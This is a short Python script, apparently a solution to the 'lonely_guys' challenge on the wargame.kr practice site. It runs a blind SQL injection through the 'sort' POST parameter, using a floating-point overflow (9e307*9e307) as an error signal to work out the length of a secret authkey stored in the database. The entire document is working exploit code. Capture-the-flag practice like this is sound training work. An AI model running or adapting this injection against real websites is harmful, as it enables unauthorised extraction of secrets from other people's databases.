import requests
import time

url = 'http://wargame.kr:8080/lonely_guys/index.php'

for i in range(1,43):
    param = ', if(length((select authkey from authkey limit 0,1))='+str(i)+',9e307*9e307,0)'
    data = {'sort' : param}
    html = requests.post(url, data=data)

    if 'jacob' in html.text:
        print(str(i) + ' is passed.')
    else:
        print(': Answer -> ' + str(i))
        break